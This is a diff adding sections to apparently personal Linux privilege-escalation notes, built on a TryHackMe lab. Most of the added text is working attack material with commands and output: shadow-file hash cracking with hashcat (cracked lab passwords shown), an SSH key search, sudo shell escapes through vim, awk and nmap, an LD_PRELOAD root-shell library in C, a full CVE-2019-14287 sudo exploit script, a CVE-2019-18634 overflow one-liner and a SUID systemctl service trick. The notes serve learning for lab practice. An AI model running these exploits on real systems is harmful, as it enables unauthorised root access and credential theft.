@@ -17,6 +17,13 @@ Here are some methods you can start with.
   - [Escalation via Kernel Exploits](#escalation-via-kernel-exploits)
   - [Escalation via Stored Passwords](#escalation-via-stored-passwords)
   - [Escalation via Weak File Permissions](#escalation-via-weak-file-permissions)
+  - [Escalation via SSH Keys](#escalation-via-ssh-keys)
+  - [Escalation via Sudo Shell Escaping](#escalation-via-sudo-shell-escaping)
+  - [Escalation via Intended Functionality](#escalation-via-intended-functionality)
+  - [Escalation via LD_PRELOAD](#escalation-via-ld_preload)
+  - [CVE-2019-14287](#CVE-2019-14287)
+  - [CVE-2019-18634](#CVE-2019-18634)
+  - [SUID](#suid)
 ## system enumeration
 Build yourself an image about the system you are on.
 Start by getting the name  
@@ -844,7 +851,8 @@ int main(int argc, char *argv[])
 The exploit Dirtycow shows in the comments how to compile and run it. I recommend using `-static` flag as well to make the program portable.
 The linux-exploit-suggester.sh (check my repo `hacking-tools` in `escalation` folder)can also find exploits for you and it will identify the same exploit.
 
-If you can't download the code and exploit it on the target machine you can compile it on your machine and `scp` or start and local http server and download it with `wget` in my repo `hacking-tools` in the folder `helpers` I have a script `startHttpServer.sh` that will set up a python http server on port 8000 (or what ever port you pass to the script as an argument). Then you can download it with something like `wget http://[YOUR_IP]:8000/[NAME_OF_PROGRAM]`. Then run it 
+If you can't download the code and exploit it on the target machine you can compile it on your machine and `scp` or start and local http server and download it with `wget` in my repo `hacking-tools` in the folder `helpers` I have a script `startHttpServer.sh` that will set up a python http server on port 8000 (or what ever port you pass to the script as an argument). Then you can download it with something like `wget http://[YOUR_IP]:8000/[NAME_OF_PROGRAM]`.  
+Then run it 
 ``` c
 ./dirty [PASSWORD]
 ```
@@ -861,4 +869,494 @@ find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
 Try to search for other strings like PASS, PASSWD or PWD. TOKEN can also be useful.
 
 ## Escalation via Weak File Permissions
+This example is from [Linux PrivEsc Arena](https://tryhackme.com/r/room/linuxprivescarena) on Try Hack Me
+
+---
+
+This room will teach you a variety of Linux privilege escalation tactics, including kernel exploits, sudo attacks, SUID attacks, scheduled task attacks, and more. This lab was built utilizing Sagi Shahar's privesc workshop (https://github.com/sagishahar/lpeworkshop) and utilized as part of The Cyber Mentor's Linux Privilege Escalation Udemy course (http://udemy.com/course/linux-privilege-escalation-for-beginners).
+
+All tools needed to complete this course are in the user folder (/home/user/tools).
+
+Let's first connect to the machine. SSH is open on port 22. Your credentials are:
+
+username: TCM
+password: Hacker123
+
+---
+
 If it turns out that you have read access to `/etc/shadow` you can escalate your priviledges by "unshadowing" the file.
+``` bash
+$ ls -la /etc/passwd
+-rw-r--r-- 1 root root 950 Jun 17  2020 /etc/passwd
+$ ls -ls /etc/shadow
+4 -rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
+```
+Take a look at the content
+``` bash
+$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+statd:x:103:65534::/var/lib/nfs:/bin/false
+TCM:x:1000:1000:user,,,:/home/user:/bin/bash
+$ cat /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+daemon:*:17298:0:99999:7:::
+bin:*:17298:0:99999:7:::
+sys:*:17298:0:99999:7:::
+sync:*:17298:0:99999:7:::
+games:*:17298:0:99999:7:::
+man:*:17298:0:99999:7:::
+lp:*:17298:0:99999:7:::
+mail:*:17298:0:99999:7:::
+news:*:17298:0:99999:7:::
+uucp:*:17298:0:99999:7:::
+proxy:*:17298:0:99999:7:::
+www-data:*:17298:0:99999:7:::
+backup:*:17298:0:99999:7:::
+list:*:17298:0:99999:7:::
+irc:*:17298:0:99999:7:::
+gnats:*:17298:0:99999:7:::
+nobody:*:17298:0:99999:7:::
+libuuid:!:17298:0:99999:7:::
+Debian-exim:!:17298:0:99999:7:::
+sshd:*:17298:0:99999:7:::
+statd:*:17299:0:99999:7:::
+TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
+```
+The `x` in the second column in `/etc/passwd` show that the use has a password set in `/etc/shadow`.  
+Looking in `/etc/shadow` we can se that two users, root and TCM, got an hash in the second column. This means they have passwords. 
+The symbol `*` in the shadow field means no password can be used to access the account. This usually occurs in daemon accounts that an ordinary user can't access, such as root, bin, daemon, etc.
+
+Now copy the content and place it into two files on your attack machine. And then remove all lines for users without password so you get this
+``` bash
+$ passwd
+root:x:0:0:root:/root:/bin/bash
+TCM:x:1000:1000:user,,,:/home/user:/bin/bash
+$ cat shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
+```
+Then it's time to unshadow the file using the tool `unshadow`. It takes two filenames as arguments, the passwd and shadow files  
+``` bash
+$ unshadow passwd shadow 
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash
+TCM:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:1000:1000:user,,,:/home/user:/bin/bash
+```
+This will print out a joint file with the hash inside the passwd file. Save it to a new file.
+
+Now we need to find out the type of the hash so that we can run `hashcat` on googling "hashcat hash modes" will get you to the hashcat page with a table with all supported hashes that hashcat can crack. Search the page for "$6$" to get the correct hash mode.
+
+It will show you this line
+| Hash-Mode | Hash-Name | Example |
+| - | - | - |
+|1800 | sha512crypt, SHA512 (Unix) 2 | $6$52450745$k5ka2p8bFuSmoVT1tzOyyuaREkkKBcCNqoDKzYiJL9RaE8yMnPgh2XzzF0NDrUhgrcLwg78xs1w5pJiypEdFX/ |
+|  |  |  |
+
+Here comes a shortend output from hashat help
+``` bash
+$ hashcat --help
+hashcat (v6.2.6) starting in help mode
+
+Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...
+
+- [ Options ] -
+
+ Options Short / Long           | Type | Description                                          | Example
+================================+======+======================================================+=======================
+ -m, --hash-type                | Num  | Hash-type, references below (otherwise autodetect)   | -m 1000
+ -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3
+ -V, --version                  |      | Print version                                        |
+ -O, --optimized-kernel-enable  |      | Enable optimized kernels (limits password length)    |
+
+```
+Then run the command to crack the password. This is best doing om a physical machine to be able to use GPU instead of virtual VPU since it is a heavy load cracking.
+
+``` bash
+$ hashcat -m 1800 unshadow passwords.txt -o output -O
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-haswell-Intel(R) Core(TM) i5-6200U CPU @ 2.30GHz, 6876/13817 MB (2048 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 15
+
+Hashes: 2 digests; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Optimized-Kernel
+* Zero-Byte
+* Uses-64-Bit
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: passwords.txt
+* Passwords.: 3
+* Bytes.....: 34
+* Keyspace..: 3
+* Runtime...: 0 secs
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.           
+
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
+Hash.Target......: unshadow
+Time.Started.....: Fri Mar 22 06:43:49 2024 (1 sec)
+Time.Estimated...: Fri Mar 22 06:43:50 2024 (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Base.......: File (passwords.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:        9 H/s (0.99ms) @ Accel:32 Loops:1024 Thr:1 Vec:4
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
+Progress.........: 6/6 (100.00%)
+Rejected.........: 0/6 (0.00%)
+Restore.Point....: 0/3 (0.00%)
+Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:4096-5000
+Candidate.Engine.: Device Generator
+Candidates.#1....: password123 -> Hacker123
+Hardware.Mon.#1..: Temp: 45c Util: 35%
+
+Started: Fri Mar 22 06:43:10 2024
+Stopped: Fri Mar 22 06:43:52 2024
+
+$ cat output
+$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:Hacker123
+$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123
+```
+Since *Hacker123* is the user TCM's password we now know that root's password is *password123*.
+So lets try it out
+``` bash
+TCM@debian:~$ su -
+Password: 
+root@debian:~#
+```
+
+## Escalation via SSH Keys
+There are some commands that can help you finding ssh-keys on a machine
+``` bash
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+```
+If you can't find anything, try search for `find / -name id_rsa 2> /dev/null` in case other keys than rsa is used.
+
+Copy what you find to attacking machine and try to login as `root` 
+
+## Escalation via Sudo Shell Escaping
+A great place to find vulnerables is at [GTFObins](https://gtfobins.github.io/)
+
+First check what you can run as root
+``` bash
+$ sudo -l
+Matching Defaults entries for TCM on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User TCM may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+```
+Try to see it there is a way of exploiting vim and sudo to get higher priviledges.  
+Seaching for vim and then click on sudo will show you this command `sudo vim -c ':!/bin/sh'`, so let's try it out
+``` bash
+$ sudo vim -c ':!/bin/sh'
+
+sh-4.1# whoami
+root
+```
+Other suitable commands to get root on this machine are
+``` bash
+$ sudo find /bin -name nano -exec /bin/sh \;
+$ sudo awk 'BEGIN {system("/bin/sh")}'
+$ echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+```
+
+## Escalation via Intended Functionality
+Sometimes there is no need for an exploit since some command have intended functionality in a way it was not intended
+
+Looking at what can be run as sudo again
+``` bash
+$ sudo -l
+Matching Defaults entries for TCM on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User TCM may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+```
+searching for apache on GTFObins give no result... But googling a bit shows that apache have a build in way to read system files `sudo apache2 -f /etc/shadow`
+
+Trying it out gives this result
+```
+$ sudo apache2 -f /etc/shadow
+Syntax error on line 1 of /etc/shadow:
+Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
+```
+An error, but we still get the hash for root!
+
+## Escalation via LD_PRELOAD
+Looking again at the `sudo -l` command shows that the user can use *LD_PRELOAD* command.  
+This is a way of preload a lib before the acctual command runs
+``` bash
+$ sudo -l
+Matching Defaults entries for TCM on this host:
+    env_reset, env_keep+=LD_PRELOAD
+
+User TCM may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+```
+``` bash
+$ vi ld_preload_shell.c
+enter the following content
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+
+$ gcc -fPIC -shared -o ld_preload_shell.so ld_preload_shell.c -nostartfiles
+$ ll
+total 16
+-rwxr-xr-x  1 TCM user 3975 Mar 22 04:53 ld_preload_shell.so
+-rw-r--r--  1 TCM user  164 Mar 22 04:52 ld_preload_shell.c
+```
+
+```
+$ sudo LD_PRELOAD=/home/user/ld_preload_shell.so apache2
+root@debian:/home/user#
+```
+## CVE-2019-14287
+Security Bypass
+This is a flaw in sudo versions up to 1.8.27
+
+``` python
+# Exploit Title : sudo 1.8.27 - Security Bypass
+# Date : 2019-10-15
+# Original Author: Joe Vennix
+# Exploit Author : Mohin Paramasivam (Shad0wQu35t)
+# Version : Sudo <1.8.28
+# Tested on Linux
+# Credit : Joe Vennix from Apple Information Security found and analyzed the bug
+# Fix : The bug is fixed in sudo 1.8.28
+# CVE : 2019-14287
+
+'''Check for the user sudo permissions
+
+sudo -l 
+
+User hacker may run the following commands on kali:
+    (ALL, !root) /bin/bash
+
+
+So user hacker can't run /bin/bash as root (!root)
+
+
+User hacker sudo privilege in /etc/sudoers
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+
+hacker ALL=(ALL,!root) /bin/bash
+
+
+With ALL specified, user hacker can run the binary /bin/bash as any user
+
+EXPLOIT: 
+
+sudo -u#-1 /bin/bash
+
+Example : 
+
+hacker@kali:~$ sudo -u#-1 /bin/bash
+root@kali:/home/hacker# id
+uid=0(root) gid=1000(hacker) groups=1000(hacker)
+root@kali:/home/hacker#
+
+Description :
+Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
+-u#-1 returns as 0 which is root's id
+
+and /bin/bash is executed with root permission
+Proof of Concept Code :
+
+How to use :
+python3 sudo_exploit.py
+
+'''
+
+
+#!/usr/bin/python3
+
+import os
+
+#Get current username
+
+username = input("Enter current username :")
+
+
+#check which binary the user can run with sudo
+
+os.system("sudo -l > priv")
+
+
+os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
+
+binary_file = open("binary")
+
+binary= binary_file.read()
+
+#execute sudo exploit
+
+print("Lets hope it works")
+
+os.system("sudo -u#-1 "+ binary)
+```
+## CVE-2019-18634
+'pwfeedback' Buffer Overflow  
+Sudo versions prior to 1.8.26  
+Sudo's pwfeedback option can be used to provide visual feedback when the user is inputting  
+their password. For each key press, an asterisk is printed. This option was added in  
+response to user confusion over how the standard Password: prompt disables the echoing   
+of key presses. While pwfeedback is not enabled by default in the upstream version of sudo,  
+some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.  
+
+Due to a bug, when the pwfeedback option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow.  
+This bug can be triggered even by users not listed in the sudoers file. There is no impact unless pwfeedback has been enabled.  
+https://github.com/saleemrashid/sudo-cve-2019-18634
+
+``` bash
+$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
+```
+
+## SUID
+The SUID stands for setuid which means that a command runs as the owning user. This can be exploited for some services.
+
+One way to find command with the SUID is to run this
+
+``` bash
+find / -perm -u=s -type f 2>/dev/null
+```
+what it does is find files from folder `/`, looking for permission where `u=s` and the type is `f` (file) and send errors to `/dev/null` 
+Here is an example  
+``` bash
+$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/squid/pinger
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/su
+/bin/ntfs-3g
+/bin/mount
+/bin/ping6
+/bin/umount
+/bin/systemctl
+/bin/ping
+/bin/fusermount
+/sbin/mount.cifs
+```
+
+Looking at [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#suid) for systemctl will give (kind of) this solution.
+
+``` bash
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+```
+This will make a temporary file as a service  
+`TF=$(mktemp).service`  
+Then put the content in that service that will execute (as root) in the file  
+``` bash
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "id > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+```
+Here you want to modify this line to do what you want  
+`ExecStart=/bin/sh -c "id > /tmp/output"`  
+Then you link the new service to the system  
+`/bin/systemctl link $TF`  
+and activate and run it  
+`/bin/systemctl enable --now $TF`  
+You now have the output from your command in the file `/tmp/output`
